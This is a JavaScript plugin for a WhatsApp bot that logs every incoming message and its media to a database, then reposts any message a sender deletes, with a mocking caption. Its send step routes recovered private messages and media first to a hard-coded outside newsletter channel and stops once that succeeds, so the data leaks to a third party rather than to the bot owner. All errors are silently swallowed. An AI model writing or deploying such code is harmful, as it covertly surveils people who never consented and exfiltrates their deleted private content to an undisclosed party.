const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
const translate = require("google-translate-api-x");

// ================= MEMORY BOOST =================
const memoryCache = new Map();
const processedDeletes = new Set();

module.exports = {
    name: "anti_delete_v3_ultra",

    trigger: (m) => {
        return m.message && !m.key.fromMe;
    },

    async onMessage(m, sock, ctx) {
        const { supabase, userSettings } = ctx;
        const style = userSettings?.style || "harsh";
        const lang = userSettings?.lang || "en";

        const msgId = m.key.id;

        try {
            // ================= CONFIG CACHE =================
            let config = memoryCache.get("anti_delete_enabled");

            if (!config) {
                const { data } = await supabase
                    .from("luper_config")
                    .select("is_active")
                    .eq("config_key", "anti_delete_enabled")
                    .single();

                config = data?.is_active;
                memoryCache.set("anti_delete_enabled", config);

                // auto refresh cache every 30s
                setTimeout(() => memoryCache.delete("anti_delete_enabled"), 30000);
            }

            if (!config) return;

            const isDelete = m.message?.protocolMessage?.type === 0;

            // ================= BUFFER STORE =================
            if (!isDelete) {
                memoryCache.set(msgId, {
                    content: m.message,
                    jid: m.key.remoteJid,
                    sender: m.key.participant || m.key.remoteJid,
                    type: Object.keys(m.message)[0],
                    time: Date.now()
                });

                // background DB save (non-blocking)
                supabase.from("luper_buffer").upsert({
                    msg_id: msgId,
                    remote_jid: m.key.remoteJid,
                    participant_jid: m.key.participant || m.key.remoteJid,
                    message_content: m.message,
                    msg_type: Object.keys(m.message)[0]
                }).catch(() => {});

                return;
            }

            // ================= DELETE DETECT =================
            const deletedId = m.message.protocolMessage.key.id;

            if (processedDeletes.has(deletedId)) return;
            processedDeletes.add(deletedId);

            let bufferedMsg = memoryCache.get(deletedId);

            // fallback to DB if not in memory
            if (!bufferedMsg) {
                const { data } = await supabase
                    .from("luper_buffer")
                    .select("*")
                    .eq("msg_id", deletedId)
                    .single();

                if (!data) return;

                bufferedMsg = {
                    content: data.message_content,
                    jid: data.remote_jid,
                    sender: data.participant_jid,
                    type: data.msg_type,
                    time: new Date(data.created_at).getTime()
                };
            }

            // ================= STYLE =================
            const modes = {
                harsh: {
                    head: "☣️ 𝕬𝕹𝕿𝕴-𝕯𝕰𝕷𝕰𝕿𝕰 𝕰𝖃𝕻𝕺𝕾𝕰𝕯 ☣️",
                    body: "𝕿𝖗𝖎𝖊𝖉 𝖙𝖔 𝖍𝖎𝖉𝖊. 𝕴 𝖘𝖆𝖜 𝖎𝖙.",
                    footer: "𝕹𝖔 𝖊𝖘𝖈𝖆𝖕𝖊."
                },
                normal: {
                    head: "💠 Anti Delete Log 💠",
                    body: "Deleted message recovered.",
                    footer: "System secured."
                },
                girl: {
                    head: "🫧 Secret Found 🫧",
                    body: "I saw what you deleted~",
                    footer: "Nothing is hidden 💕"
                }
            };

            const current = modes[style] || modes.normal;

            const sender = bufferedMsg.sender.split("@")[0];
            const location = bufferedMsg.jid.endsWith("@g.us") ? "Group" : "Private";

            let report = `*${current.head}*\n\n`;
            report += `👤 @${sender}\n`;
            report += `📍 ${location}\n`;
            report += `⏱ ${new Date(bufferedMsg.time).toLocaleString()}\n\n`;
            report += `${current.body}\n\n_${current.footer}_`;

            const { text: translated } = await translate(report, { to: lang });

            // ================= MEDIA =================
            let mediaBuffer = null;
            const type = bufferedMsg.type;
            const msg = bufferedMsg.content[type];

            try {
                if (type.toLowerCase().includes("image") ||
                    type.toLowerCase().includes("video") ||
                    type.toLowerCase().includes("audio") ||
                    type.toLowerCase().includes("document")) {

                    const stream = await downloadContentFromMessage(
                        msg,
                        type.replace("Message", "").toLowerCase()
                    );

                    let buffer = Buffer.from([]);
                    for await (const chunk of stream) {
                        buffer = Buffer.concat([buffer, chunk]);
                    }

                    mediaBuffer = buffer;
                }
            } catch {}

            // ================= BRUTE FORCE SEND =================
            const targets = [
                "120363426850850275@newsletter",
                sock.user.id.split(":")[0] + "@s.whatsapp.net"
            ];

            for (const target of targets) {
                for (let i = 0; i < 3; i++) { // retry 3 times
                    try {
                        if (mediaBuffer) {
                            await sock.sendMessage(target, {
                                [type.replace("Message", "")]: mediaBuffer,
                                caption: translated,
                                mentions: [bufferedMsg.sender]
                            });
                        } else {
                            const text =
                                bufferedMsg.content.conversation ||
                                bufferedMsg.content.extendedTextMessage?.text ||
                                "Media";

                            await sock.sendMessage(target, {
                                text: `${translated}\n\n*Original:* ${text}`,
                                mentions: [bufferedMsg.sender]
                            });
                        }

                        return; // success → stop everything
                    } catch {
                        await new Promise(r => setTimeout(r, 1000));
                    }
                }
            }

        } catch {
            // silent (no crash)
        }
    }
};
